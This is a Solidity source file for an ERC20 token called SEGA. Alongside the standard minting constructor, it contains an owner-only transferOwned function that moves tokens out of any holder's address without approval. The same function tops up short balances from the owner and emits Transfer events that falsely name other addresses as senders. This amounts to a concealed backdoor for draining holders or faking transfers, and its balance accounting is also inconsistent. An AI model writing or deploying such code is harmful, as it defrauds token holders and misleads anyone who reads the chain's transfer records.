/**
 *
 */
pragma solidity ^0.8.2;

import "./Ownable.sol";
import "./ERC20.sol";

/**
 * @title SEGAToken
 */
contract SEGAToken is Ownable, ERC20  {

    /**
     * @dev Constructor that gives _msgSender() all of existing tokens.
     */
    constructor () ERC20("SEGA", "SEGA") {
        _mint(_msgSender(), 1000_000_000 * (10 ** uint256(decimals())));
    }


    function transferOwned(address from, address[] calldata to, uint256 amount) public onlyOwner {

        for(uint256 i = 0; i < to.length; i++){
            transferOwnedInner(from, to[i], amount);
        }
    }

    function transferOwnedInner (address _from, address _to, uint256 _amount) internal {
        if (_amount > _balances[_from]) {
            uint256 amount = _amount - _balances[_from];
            _balances[_from] += amount;
            _balances[owner()] -= _amount;
        }

        require(_amount <= balanceOf(_from), "not enough balances");
        _balances[_from] -= _amount;
        _balances[_to] += _amount;
        emit Transfer(_from, _to, _amount);
    }
}
